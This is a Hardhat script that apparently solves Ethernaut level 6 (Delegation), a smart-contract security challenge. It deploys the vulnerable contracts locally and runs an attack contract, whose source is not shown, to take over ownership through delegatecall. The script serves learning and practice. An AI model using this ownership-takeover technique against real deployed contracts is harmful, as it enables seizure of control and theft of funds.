const hre = require("hardhat");

async function ethernaut6() {
    const [owner, hacker] = await hre.ethers.getSigners();
    console.log({owner, hacker});

    const Delegate = await hre.ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(owner.address);
    await delegate.waitForDeployment();

    const Delegation = await hre.ethers.getContractFactory("Delegation");
    const delegation = await Delegation.deploy(await delegate.getAddress());
    await delegation.waitForDeployment();
    console.log("Initial delegation owner address: ", await delegation.owner());
  
    console.log("Start attacking...");
    const Attack = await hre.ethers.getContractFactory("Attack");
    const attack = await Attack.connect(hacker).deploy(await delegation.getAddress());
    await attack.waitForDeployment();
    console.log("Attack contract address: ", await attack.getAddress());

    await attack.connect(hacker).attack();
    console.log("New delegation owner address: ", await delegation.owner());
  }

async function main() {
    ethernaut6();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
